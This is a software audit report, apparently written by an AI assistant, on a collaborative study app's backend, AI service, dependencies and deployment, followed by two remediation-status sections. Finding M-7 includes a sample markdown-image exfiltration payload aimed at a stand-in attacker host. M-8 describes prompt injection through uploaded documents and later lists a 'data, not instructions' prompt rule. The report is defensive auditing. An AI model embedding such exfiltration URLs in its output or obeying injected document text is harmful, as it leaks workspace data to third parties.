# CollabMind AI — Full application audit

Date: 2026-10-03 · Branch `phase1/auth-security` (HEAD `b6163ee` plus a large uncommitted working tree) · Auditor: Claude (read-only; nothing was changed, committed or deployed)

## 0. Scope, method and limits

**Read in full:** all backend routes, middleware, services, controllers, socket layer, DB layer; AI service `main.py`, `config.py`, `db.py`, `security.py`, `schemas.py`, `llm/{router,deepseek}.py`, `rag/{extractor,embedder,retriever,pipeline,grounding,generator}.py`, `agents/{runner,study_coach_graph}.py`; all 5 SQL migrations; `docker-compose.yml`, the three Dockerfiles, `render.yaml`, `seed.sql`, `start.sh`/`test.sh`; frontend `auth.ts`, `proxy.ts`, `api.ts`, `authToken.ts`, socket hooks, `ChatInterface`, `ChatMessage`; `docs/phase4-integration-audit.md` (treated as a claim, not as evidence).

**Executed:** `npm audit --omit=dev` (backend, frontend); frontend unit tests (**15/15 pass**); a backend `npm test` (integration tests are skipped without `TEST_DATABASE_URL`/`TEST_REDIS_URL`; the run printed no summary and had to be killed at the timeout, so I have **no backend test result**); tracked-file and git-history secret scans.

**Not done (so not claimed):** Python tests, integration/E2E runs, Docker bring-up, any live DeepSeek/BGE-M3/LiveKit/Supabase call, browser testing, load testing, review of the remaining ~25 frontend components (messaging UI, studio tools, dialogs), `ai/rag/{chunker,embedding_provider,usage}.py`, `ai/llm/{errors,redaction}.py`, and the test files themselves.

Tags: **[READ]** from code · **[RUN]** observed by executing · **[ASSUMED]** reasoned, not demonstrated.

---

## 1. System overview

| Layer | Tech | Role |
|---|---|---|
| Frontend | Next.js 16.2, React 19, NextAuth v5 beta (Credentials), Zustand, Tailwind/shadcn, socket.io-client, livekit-client | UI; stores backend JWT inside the NextAuth session |
| Backend | Node 20 / Express 4, pg, ioredis, socket.io (+Redis adapter), multer, nodemailer | Auth authority, workspaces/members, sources, workspace chat, 1:1/group messaging, LiveKit calls, rate limiting; proxies to AI service |
| AI service | Python 3.11 / FastAPI, asyncpg, MarkItDown, httpx, LangGraph | Extraction → chunk → BGE-M3 embed → pgvector; hybrid retrieval; DeepSeek chat/studio; study-coach agent |
| Data | Postgres (Supabase) + pgvector, Redis, GCS or shared local volume, Supabase Storage (chat files), LiveKit | |

Trust model: browser → backend (session JWT + DB-backed session row) → AI service (shared bearer `AI_SERVICE_TOKEN`). The AI service trusts the backend for authorization; all SQL it runs is workspace-scoped.

---

## 2. Executive summary

The security core is better than typical for a project at this stage: fail-fast secrets, revocable sessions, enumeration-resistant auth, workspace-scoped SQL everywhere, layered SSRF defence, grounded/citation-validated RAG, RLS on every table. **No critical vulnerability and no SQL injection / XSS / cross-tenant read was found in the code I read.**

The problems are mostly **reliability, deployability and product correctness**, plus an aging dependency tree:

1. **Workspace chat history is broken after 50 messages** (returns the *oldest* 50, never the newest) — a core feature bug.
2. **One chat request can hold a DB connection for up to 150 s**; with a pool of 10, a handful of concurrent chats freeze the entire API (auth itself needs the pool).
3. **The Render blueprint cannot deploy** this version (missing required secrets, no AI service, leftover Google vars).
4. **Dependencies:** frontend 30 advisories (3 critical, 19 high), backend 20 (8 high); backend image is on **Node 20, which reached end-of-life in April 2026**.
5. **Cost/abuse controls are partial**: studio and messaging endpoints accept unbounded input or have no rate limit; no spend cap.
6. **Operational maturity is thin**: no CI, no readiness checks, no graceful shutdown, console-only logging, agent runs are not durable.

Verdict: sound foundations; **not production-ready** until findings H-1…H-5 are closed. Estimated effort for H-1…H-5 is small (days, not weeks).

---

## 3. Findings

Severity: **High** = core feature broken / outage / unsafe by default · **Medium** = significant weakness or missing control · **Low** = hygiene.

### High

**H-1 · Chat history shows the oldest 50 messages, never the latest** [READ]
`backend/src/services/chatService.js:102-124` selects `ORDER BY created_at ASC LIMIT n` with an optional `created_at < before`. With no cursor (what `ChatInterface.tsx:33` sends via `getChatHistory`) you get the first 50 messages ever. Once a workspace passes 50 messages, a reload shows stale history and the new conversation disappears; "older" pagination also returns the oldest rows again. The UI has no "load older" control.
Fix: `ORDER BY created_at DESC LIMIT n`, reverse in code (as `messageService.listMessages` already does), add `has_more` + a cursor in the UI. Add a regression test with >50 rows.

**H-2 · DB transaction + pooled connection held across the LLM call** [READ]
`chatService.sendChatMessage` does `BEGIN`, inserts the user message, then awaits the AI service (timeout 150 s, streaming path too) before `COMMIT`. `pg` pool `max: 10` (`db/postgres.js`). Every authenticated request also needs a pool connection (`verifySessionToken`). Ten concurrent chats (the per-user limit is 20/min, so 10 users suffice) → all other requests queue up to the 5 s connection timeout and fail → apparent total outage during LLM slowness or a provider incident.
Side effects of the same design: the user's question is rolled back if the AI fails (the UI tells the user to resend); other members cannot see the question until the answer exists; the reply is published to Redis *before* `COMMIT`.
Fix: insert the user message and release the connection; call the AI with no connection held; insert the reply separately (and mark failures). Consider a larger pool or a separate pool for long work.

**H-3 · Deployment blueprint is stale and cannot start** [READ]
`render.yaml` lacks `AI_SERVICE_TOKEN` (backend exits at startup), `SMTP_URL` (required when `NODE_ENV=production`), `CORS_ORIGINS`, `APP_URL`, `REDIS` password handling, `API_INTERNAL_URL`, and defines **no AI service** at all; it still lists `GOOGLE_CLIENT_ID/SECRET`. Builds use `npm install` (not `ci`); free plan instances sleep, which breaks sockets, the call sweeper and the hourly purge. `start.sh` and `test.sh` reference a compose `db` service that does not exist and `test.sh` still calls the removed `/auth/google`. README is 3 lines.
Fix: regenerate the blueprint from `docker-compose.yml` + `.env.example`, add the AI service, pin `npm ci`, delete or fix the dead scripts, write a real README.

**H-4 · Known-vulnerable dependencies; EOL runtime** [RUN `npm audit --omit=dev`]
- Frontend: 30 advisories (3 critical, 19 high). Critical: `next` (Server Components DoS), `next-auth`/`@auth/core` (email-normaliser bypass; "configuration errors can cause existence-based auth checks to fail open"). The app uses the Credentials provider and its own cookie-presence middleware, so the Auth.js ones are probably not directly exploitable, but they should be upgraded. High includes `socket.io-parser`, `ws`, `sharp`, `postcss`, `path-to-regexp`, and **`shadcn` (a CLI) listed as a runtime dependency**.
- Backend: 20 advisories (8 high): `axios` (NO_PROXY SSRF bypass — relevant because the backend makes server-side calls), `multer` (DoS via deeply nested field names — on the upload path), `socket.io-parser`/`engine.io`/`ws` (DoS), `form-data`, `path-to-regexp`.
- Node versions: backend image `node:20-alpine` (EOL 2026-04-30), `engines: >=18`, frontend `node:22`. Align on a supported LTS.
- Python deps are unpinned ranges (`fastapi>=`, `langgraph>=0.1.0`, `langchain>=0.2.0` …) with no lockfile; only `markitdown` is pinned. [READ] I did not run `pip-audit`.
Fix: `npm audit fix` / bump `next`, `next-auth`, `axios`, `multer`, `socket.io`; remove `shadcn` and unused `@supabase/*` from `dependencies`; pin Python with a constraints/lock file; add Dependabot/Renovate.

**H-5 · Document extraction runs in-process with no resource isolation** [READ]
`ai/rag/embedder.py` runs MarkItDown in `asyncio.to_thread` under `asyncio.wait_for`. A timeout does not stop the thread, and the 50/60 MB limits apply to the *compressed* file. A zip-bomb `.docx/.xlsx/.pptx` or a pathological PDF can exhaust memory/CPU of the single uvicorn worker that also serves chat for every workspace. Any workspace member can upload (30/min/user).
Fix: run extraction in a subprocess/worker with RLIMITs and a hard kill, cap decompressed size, queue indexing separately from the request path.

### Medium

**M-1 · Missing or partial rate limits** [READ]
Limited: auth endpoints, chat, studio/agents/summarize, upload/URL import. **Unlimited:** `POST /api/workspaces/:id/members` (and therefore an email-existence oracle, see M-4), `/api/conversations*` (send message, attachments up to 25 MB, create conversation, search users), `/api/calls/*` and `POST …/calls` (rings every member), workspace create/update/delete, all reads. Socket `presence:typing` and `conv:typing` are unthrottled, and `presence:typing` does a DB membership query per event while `ChatInterface.tsx:174` emits it on every keystroke. Behind a reverse proxy without `TRUST_PROXY` (neither compose nor render sets it) every client shares one IP, so `login-ip` (30 / 15 min) can lock everyone out.
Fix: a default per-user/IP limiter on the whole API, specific limits on messaging/calls/members, throttle typing server-side (and cache membership for a few seconds), document and set `TRUST_PROXY`.

**M-2 · Redis outage can hang the API** [READ, ASSUMED behaviour]
`db/redis.js` keeps `enableOfflineQueue: true` with unbounded reconnect; the rate limiter's Redis path (`RATE_LIMIT_STORE=redis`, set by compose) awaits `multi().exec()`. The memory fallback only triggers on an *error*, not on a queued command, so requests (including login) may wait for the client's retry budget instead of failing over. Set `enableOfflineQueue:false`/`maxRetriesPerRequest` small, or wrap the call in a short timeout. Test it by stopping Redis.

**M-3 · `summarize` relays AI-service 401/403 to the browser** [READ]
`sourceController.summarizeSource` maps `status >= 500 ? 502 : status`. If `AI_SERVICE_TOKEN` is wrong or rotated, the browser receives **401**, and `api.ts`/`authToken.handleUnauthorized` signs the user out. `agents.js` handles this correctly (`relayError`); reuse it. Also loses the useful 404 `no_relevant_sources` / 429 / 503 messages.

**M-4 · Member and user directory exposure** [READ]
- Any user can create a workspace (becomes owner) and then call `POST …/members` with arbitrary emails: 404 "No user found with email" vs 409/201 reveals which addresses are registered and verified, with no rate limit — this undoes the anti-enumeration design in `authService.register`.
- Adding a member is immediate; the target gets no invite/consent step, and from that moment their name and **email are visible to everyone in the workspace** (`listMembers`, `searchUsers`, `loadMembers`), and they become DM-able by all members.
- `listSources` returns `sources.url`, i.e. internal storage paths (`local:///app/uploads/...`, `gs://bucket/...`) to every member.
- Users cannot leave a workspace (removal requires owner; self-removal is blocked), and an owner cannot leave either.
Fix: invite/accept flow, generic response + limiter on add-by-email, hide email from non-admin views, drop `url` from file sources in API output, add "leave workspace".

**M-5 · Agent (study coach) design** [READ]
- Approval is not bound to run state: `POST …/agents/:runId/approve` only checks the run exists in the workspace; it sets `approved:<id>` for 300 s. Approving **before** the graph reaches `await_approval` skips the human gate, and *any* member (not the requester) can approve.
- Runs are in-process `BackgroundTasks` polling Redis for up to 10 minutes; a restart leaves rows stuck in `started`/`awaiting_approval` forever (no reaper, no checkpointing).
- `runner.py` publishes `"Agent error: {str(e)}"` to the whole workspace room, which can contain provider/SQL internals.
- The previous audit (P4-023) says the agent is unreachable; the **graph is reachable** through `/agents/study-coach` (the unused part is the older `StudyCoachAgent` ReAct class).

**M-6 · Studio/AI input is unbounded** [READ]
`ai/schemas.py` has no length/range limits (`count`, `topic`, `title`, `outline_points`, `difficulty`, ids are plain `str`), and `proxyStudio` forwards the whole body. Large `count` or lists inflate prompts and cost; output is capped at 4096 tokens so large requests end as truncated JSON → 502. Studio usage is recorded with `user_id=None`, so spend cannot be attributed per user. There is no per-workspace or global budget. Add Pydantic `Field(max_length/ge/le)`, UUID types, and a usage cap.

**M-7 · Model output rendered as Markdown can load remote images** [READ, ASSUMED exploit]
`StudyGuideTool.tsx:67` renders `react-markdown` (raw HTML is off, `javascript:` links are stripped by default), but `![](https://attacker/…?q=…)` images are fetched automatically. Combined with prompt injection from an uploaded document (see M-8) a model can be steered to embed workspace text in an image URL → data exfiltration to a third party when another member views the output. Chat answers are rendered as plain text (safe). Fix: custom `components.img`/`urlTransform` allow-list, or strip images; add a CSP `img-src 'self'`.

**M-8 · Prompt-injection residual risk** [READ]
The system prompt tells the model to treat passages as data, but any member can add a document, so one hostile PDF can try to steer answers for everyone. Citations are validated *structurally* (the `[n]` exists) but not *semantically* (the cited passage supports the claim — already tracked as P4-021). The study-coach prompts and quiz/guide prompts interpolate the user's `goal`/`topic` and raw chunks with no delimiters or system/user separation. Add delimiters, output filtering, per-source trust labels, and an evaluation set.

**M-9 · Vector search recall in a multi-tenant HNSW index** [READ, ASSUMED]
One global HNSW index on `source_chunks.embedding`, queried with `WHERE workspace_id = $1 AND status='ready'` (+ optional source filters). pgvector applies those filters *after* the index scan (default `hnsw.ef_search = 40`; the code asks for 30 candidates), so for a small workspace among many, the scan can return few or zero rows and the user sees "I could not find an answer" despite relevant content. Mitigate with pgvector ≥ 0.8 iterative scans (`hnsw.iterative_scan`), higher `ef_search`, or a partitioned/per-tenant index; add a recall test with several large workspaces. Chunks are also inserted one statement per row (`embedder.py`) — use `executemany`/`COPY`.

**M-10 · Messaging & attachments** [READ]
- Attachment type allow-list uses the **client-supplied MIME type** (`file.mimetype`); content is never sniffed, and `audio/*`/`video/*` are accepted wholesale. Downloads go through short-lived signed URLs with `download=` (good), but there is no malware scanning.
- Files are never deleted from storage when a message is deleted, a group is deleted or members leave; message deletion is a soft delete (body stays in the database).
- Call membership is a snapshot: a user removed from a group mid-call keeps `call_participants`, so `/join` and `/token` keep working until the call ends, and LiveKit tokens are valid 2 h (a deleted room can be recreated by anyone holding a token).
- DMs: only reachability at creation is checked (shared workspace); no block/mute/report; leaving the shared workspace does not end the DM.
- `listMessages` cursor uses JS millisecond timestamps against Postgres microsecond `created_at` and can skip same-millisecond rows (minor).

**M-11 · Input validation gaps on workspaces** [READ]
`workspaceController` validates only that `name` is a non-empty string: no length limit (`VARCHAR(255)` → 500 on overflow), no type check on `description`/`avatar_url` (an object causes a pg error → 500), `avatar_url` has no scheme check (conversation avatars do require `https://`), and `COALESCE` makes it impossible to clear a field. Add a shared validator.

**M-12 · Schema management is split and partly destructive** [READ]
Schema lives in three places: `supabase/migrations`, root `migration.sql` (older copy), and `ensure_schema()` in the AI service (runs `ALTER/CREATE` DDL at every boot with app credentials). `20261002020000_phase3_embeddings_rag.sql` runs `DELETE FROM source_chunks` and flags all `ready` sources failed when the column is not 1024-d, with no backup guard. `sources.status`, `agent_runs.status` have no CHECK constraints (initial comment even says `error`, code uses `failed`). Pick one migration owner, remove DDL from app boot, keep one schema file, add status CHECKs.

**M-13 · Account lifecycle and session management gaps** [READ]
No change-password, change-email, account deletion, "sign out everywhere", session list, or MFA; password policy has no breached-password check. Sessions are 7-day bearer JWTs (no refresh/rotation) that the browser JavaScript can read via `/api/auth/session` (needed by the REST/socket clients), so any future XSS yields a week-long token. Login lock-out per account (10 / 15 min) lets an attacker lock a known victim out. Registering with someone else's **unverified** email overwrites its name/password; if the real owner later clicks the verification mail they land in an account whose password the attacker knows (registration or reset by the owner overwrites it, so this is low-likelihood).

**M-14 · No security headers on the frontend** [READ]
`next.config.ts` is empty: no CSP, `X-Frame-Options`/`frame-ancestors`, `Referrer-Policy`, `Permissions-Policy`, HSTS (if not terminated upstream). The backend uses `helmet()` correctly. Add headers in Next config; calls need `connect-src` for LiveKit and the socket URL.

**M-15 · Operations: no CI, readiness, shutdown or observability** [READ]
No `.github/` workflows (tests, audit, lint, image build are manual); backend integration tests are skipped unless env vars are set and the local run did not terminate cleanly (module-level `pg`/`redis` connections keep the process alive); `/health` (backend and AI) never checks DB/Redis/embedding; no SIGTERM handler (pool, sockets, in-flight calls are dropped on deploy); `morgan('dev')` in production; no request IDs, structured logs, metrics or error tracking; AI logging uses `print`. The `Promise` from `redis.publish` in `chatService` is not awaited/caught.

### Low

- **L-1** Frontend image copies the whole build stage (dev dependencies, sources) into the runtime image; no multi-stage prune; images not pinned by digest; no `HEALTHCHECK` in Dockerfiles (compose has them).
- **L-2** `YOUTUBE` detection in the backend is a substring test (`url.includes('youtube.com')`), the AI service uses a host test and rejects YouTube anyway — users can add a source that is guaranteed to fail.
- **L-3** `embedder._mark_failed` has no `status='processing'` guard, so a late failing duplicate run can flip a `ready` source to `failed` (the backend's own failure path does guard).
- **L-4** SSRF: resolve-then-connect leaves a DNS-rebinding window in `fetch_url_bytes` (acknowledged in P4-009); `retrySource` for URL sources relies on the AI-side check only.
- **L-5** Response bodies are accumulated with `body += part` (quadratic for 10 MB) in `fetch_url_bytes`.
- **L-6** `socket.io-client` gives up after 5 reconnection attempts; `useSocket` re-creates the socket whenever the `session` object changes (possible reconnect churn on session refetch — [ASSUMED], verify in the browser).
- **L-7** Dead/leftover code: `lib/supabase/*`, `NEXT_PUBLIC_SUPABASE_*`, `@supabase/*`, `shadcn` runtime dep, `supabase/.temp/**` and `.claude/launch.json` tracked; `can()` permission map partly unused (`admin` is effectively a `member` except deleting sources); `backend/test/_probe.js` scratch file.
- **L-8** Workspace chat is one shared thread per workspace (design choice): every member's question and every answer is visible to all, with no per-user threads.
- **L-9** `render.yaml`, docs and `.env` history: `GEMINI_API_KEY`/Google variables are obsolete; the earlier audit recommends rotating the unused Gemini key — still outstanding.
- **L-10** Metadata returned to clients on every AI message includes `route` (provider, requested/used model, attempts, fallback reason) and token `usage`.
- **L-11** DeepSeek defaults (`deepseek-flash`, `deepseek-v4-pro`) were never validated against the official API; the local gateway used for the live probe set Flash == Pro (P4-022/P4-032, owner decision still open). I did not re-verify.

---

## 4. Verified strengths [READ unless noted]

- **Config fails closed:** JWT and service secrets ≥ 32 chars and not placeholders; wildcard CORS rejected; SMTP required in production; AI service refuses to start without its token.
- **Auth:** scrypt N=2^16 r=8 p=2, NFKC normalisation, constant-time compare, dummy hash for unknown users (timing), generic responses for register/resend/forgot, single-use SHA-256-hashed tokens, `UPDATE … RETURNING` consumption (no race), password reset revokes all sessions and drops sockets, JWT pinned to HS256 + iss/aud/jti with a live DB row, logout and membership removal evict live sockets.
- **Tenant isolation:** every membership check is a DB query (REST and each socket event); every source/chunk/agent/studio query includes `workspace_id`; chunks have a composite FK to `(source_id, workspace_id)`; AI `/embed` verifies the (workspace, source, url) triple; UUID params validated; non-members get an identical 403 for existing and missing workspaces.
- **Injection hygiene:** all SQL is parameterised (dynamic fragments are fixed strings), LIKE wildcards escaped, error handler never leaks 5xx internals, client chat history ignored, `workspace_id` forced last in studio proxy.
- **SSRF:** IPv4/IPv6-embedded-address aware checks in both Node and Python, redirect hop re-validation, credentials/non-http schemes rejected, size and time caps.
- **Uploads:** extension allow-list + magic bytes + NUL check + SHA-256 dedupe (also a unique index), path-traversal guard on local storage and on the AI-side file read, per-upload folders cleaned on delete.
- **RAG quality controls:** thresholded hybrid retrieval, "no relevant passages ⇒ no model call", citations copied from retrieved chunks (never from model text), invalid `[n]` stripped, refusal and "uncited" states surfaced in the UI.
- **Infrastructure:** non-root containers, Redis password and loopback-only AI/Redis ports, interactive docs disabled by default, RLS enabled on all 15 tables with no policies (deny-all to the public anon key), private chat bucket with short-lived signed URLs, `.env` files never committed (history scan: none) and no secret patterns in tracked files [RUN].

---

## 5. Prioritised remediation plan

| # | Action | Closes | Effort |
|---|---|---|---|
| 1 | Fix chat history query (+ pagination UI, test) | H-1 | hours |
| 2 | Stop holding a DB connection/transaction across LLM calls | H-2 | ½–1 day |
| 3 | `npm audit fix`, bump next/next-auth/axios/multer/socket.io; drop `shadcn`, `@supabase/*`; move to a supported Node LTS; pin Python deps | H-4 | 1 day |
| 4 | Rewrite `render.yaml` (+AI service, secrets), fix/remove dead scripts, write README | H-3 | ½ day |
| 5 | Global + per-feature rate limits, throttle typing, `TRUST_PROXY`, Redis timeouts | M-1, M-2 | 1 day |
| 6 | Map AI errors in `summarize` via `relayError` | M-3 | 15 min |
| 7 | Bound studio/AI inputs (Pydantic limits, UUID types), attribute usage to users, add a budget | M-6 | ½ day |
| 8 | Sandbox/limit extraction (subprocess, decompressed size cap) | H-5 | 1–2 days |
| 9 | Invite/accept flow, hide emails/urls, leave-workspace, generic add-member responses | M-4 | 1–2 days |
| 10 | Agent approval bound to state, durable runs + reaper, sanitise error text | M-5 | 1 day |
| 11 | Image allow-list in Markdown rendering, frontend security headers/CSP | M-7, M-14 | ½ day |
| 12 | CI (tests, audit, build), `/ready`, graceful shutdown, structured logs | M-15 | 1–2 days |
| 13 | Single migration owner, status CHECKs, retrieval recall test / iterative scan | M-9, M-12 | 1–2 days |
| 14 | Attachment sniffing/cleanup, call-membership re-check, DM controls | M-10 | 2 days |

## 6. Suggested verification after fixes

- Chat: seed 120 messages, reload → latest 50 shown, "load older" works.
- Load: 12 parallel chats against a slow mock provider while hitting `/health`-adjacent authenticated routes — latency of unrelated routes must stay flat.
- Kill Redis during login and chat; confirm bounded failure.
- Upload a decompression-bomb docx; AI `/chat` latency for other workspaces must not degrade.
- Two workspaces of different size with the same query; compare recall with and without iterative scans.
- Re-run `npm audit --omit=dev` (target: 0 critical/high), `pip-audit`, and the full Python/Node/E2E suites in CI.

---

## 7. Remediation status (applied the same day, uncommitted)

**Fixed and verified** (tests/tools in brackets)
- H-1 chat history returns the newest messages [unit test]; H-2 no DB connection/transaction held across the model call [unit test]; H-3 `render.yaml`, README, `test.sh`, `start.sh` rewritten/fixed [read-only review]; H-4 frontend `npm audit` 30 → **0**, backend 20 → 6 moderate (0 high/critical), Next 16.3.8, Node 22 images [`npm audit`, `tsc`, build].
- M-1 per-user limits on messaging/attachments/calls/member-add, a general per-IP limit, typing throttles (server and client), `TRUST_PROXY` in compose [unit tests for the limiter]; M-2 Redis timeout with memory fallback [unit test]; M-3 summarize error mapping; M-4 (partial) storage paths hidden, add-member limited, members can leave; M-5 (partial) approval only while awaiting approval, sanitised agent errors; M-6 AI request bounds [pytest]; M-7 Markdown images blocked, plus a study-guide rendering bug (wrong response field) fixed; M-9 wider HNSW search + iterative scans where supported; M-10 (partial) attachment content must match its type [unit test]; M-11 workspace input validation; M-14 security headers/CSP [production build]; M-15 (partial) `/ready`, graceful shutdown, unhandled-rejection logging; L-2 YouTube host check; L-3 failure no longer overwrites a ready source; H-5 (partial) zip-bomb size check before parsing [checked with a stubbed MarkItDown].
- Tests run after the changes: backend unit suites 59/59 and chat/regression tests 13/13; frontend 15/15, `tsc` clean, lint clean on changed files, production build succeeds; AI schema tests 2/2.

**Not fixed (needs a decision, infrastructure or larger work)**
H-5 real process isolation for parsing · M-4 invite/accept flow · M-5 durable agent runs and a reaper · M-8 prompt-injection hardening · M-10 attachment cleanup, call-membership re-check, DM block/report · M-12 single migration owner and status CHECKs · M-13 account lifecycle (password change, deletion, session list, MFA) · M-15 CI pipeline and structured logging · Python dependency pinning · "load older messages" control in the chat UI · studio usage attribution per user · L-7 dead supabase code · 6 remaining moderate backend advisories.

**Not run:** backend integration tests (need Postgres/Redis), the rest of the Python suite (dependencies not installed here), Docker bring-up, any live provider call, browser testing of the new UI behaviour.


## 8. Second remediation pass (2026-10-03, uncommitted)

**Fixed and verified**
- Frontend: `npm run lint` 33 errors / 14 warnings -> **0 / 0** (typed NextAuth session via `types/next-auth.d.ts`, `lib/errors.ts`, no `any`); `tsc` clean; dead `lib/supabase/*` and the `@supabase/*` packages removed.
- Chat UI: **"Load older messages"** control (cursor pagination, scroll position kept); history cursor compares at millisecond precision so no row is skipped (integration test over 120 rows).
- CI: `.github/workflows/ci.yml` (backend with Postgres+pgvector+Redis and migrations applied, frontend lint/tsc/test/build, AI pytest, `npm audit --audit-level=high`, image builds) and Dependabot.
- Schema: single owner (`supabase/migrations`); root `migration.sql` deleted; `ensure_schema()` is now a read-only check; status CHECK constraints (`20261003010000`), tested.
- H-5: extraction runs in a spawned child process with a hard deadline, memory cap (Linux), bounded concurrency (`ai/rag/sandbox.py`).
- M-5: stuck agent runs are failed by a reaper (`ai/agents/reaper.py`, every 5 min, runs older than 30 min).
- M-4: **invitations** (invite -> accept/decline, identical answer for any address, 14-day expiry, owner can list/cancel); member emails visible to owners/admins only; dashboard and members UI updated.
- M-8: untrusted-text fencing and a "data, not instructions" rule on studio, report and agent prompts.
- M-10: deleting a message erases its text and removes the file; the last member leaving a group removes its files; removed members cannot rejoin a call or mint a token and leave live calls; LiveKit tokens 2 h -> 1 h.
- M-13 (partial): change password (keeps this session, revokes others), sign out everywhere, delete account (blocked while owning a workspace that still has other members) + `/settings` page.
- M-15: request ids (`X-Request-Id`), JSON access logs in production, request id in 5xx logs/responses; HEALTHCHECK in all three Dockerfiles.
- M-6: studio/summarize usage is attributed to the calling user; Python dependencies bounded to tested majors.

**Verified (run today):** backend 117/117 (with Postgres+pgvector and Redis in Docker, all migrations applied), AI 256 passed / 12 skipped without a database (263 / 2 with one), frontend lint/tsc/15 tests clean.

**Still open (needs a decision or external setup)**
MFA / breached-password check · DM block/report/mute · attachment malware scanning · prompt-injection evaluation set (semantic citation checks) · per-workspace spend cap · hashed Python lockfile (`pip-compile --generate-hashes`) · pgvector recall test across large tenants · 6 moderate backend advisories · Windows has no memory cap for the extraction child · E2E (`e2e/`) and live-provider runs were not executed · the CI workflow itself has not run on GitHub.
